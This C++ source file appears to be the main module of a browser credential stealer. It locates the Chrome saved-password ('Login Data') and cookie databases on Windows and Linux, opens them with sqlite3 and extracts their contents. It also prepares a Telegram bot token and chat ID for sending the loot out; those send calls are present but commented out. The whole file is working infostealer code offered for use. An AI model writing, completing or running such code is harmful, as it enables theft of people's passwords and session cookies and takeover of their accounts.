#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <sstream>
#include <exception>

#include <csignal>
#include <cstdio>
#include <cstdlib>

#include "sender.hpp"
#include "tools.hpp"

namespace fs = std::experimental::filesystem;

int main()
{
    try
    {
        sqlite3 *db;

        const std::string TOKEN(""); //put your bot token here
        int64_t ChatID = 12345; // set your chat id here

        Sender bot_sender(TOKEN);

#if defined(__linux__)
        std::string chrome_pass_path = "~/.config/google-chrome/Default";
        std::string firefox_pass_path = "~/.mozilla/firefox/<profilename>";
#elif defined(__WIN64__)
        TCHAR username[255];
        DWORD username_len = 255;
        GetUserName((TCHAR*)username, &username_len);

        std::string chrome_pass_path = _T("C:\\Users\\");
        chrome_pass_path += username;
        chrome_pass_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

        std::string chrome_cookies_path = _T("C:\\Users\\");
        chrome_cookies_path += username;
        chrome_cookies_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");

        std::string firefox_pass_path = _T("C:\\Users\\");
        firefox_pass_path += username;
        firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
#endif
        if( fs::exists(chrome_pass_path))
        {
            std::stringstream pass;
            
            int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
                sqlite3_close(db);
            }
            else
            {
                pass = get_chrome_pass(db);
                //bot_sender.send(ChatID, pass.str());
                std::cout << pass.str();
            }
        }

        if( fs::exists(chrome_cookies_path))
        {
            std::stringstream cookies;

            int rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
            if( rc )
            {
                std::cout << "DB Error: " << sqlite3_errmsg(db) << std::endl;
                //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
                sqlite3_close(db);
            }
            else
            {
                cookies = get_chrome_cookies(db);
                //bot_sender.send(ChatID, cookies.str());
                std::cout << cookies.str();
            }
        }

        if( fs::exists(firefox_pass_path))
        {
            std::cout << "ff exists" << std::endl;
            //bot_sender.send(ChatID, "ff exists");
        }
    }
    catch(std::exception &e)
    {
        std::cerr << e.what();
    }

    return 0;
}
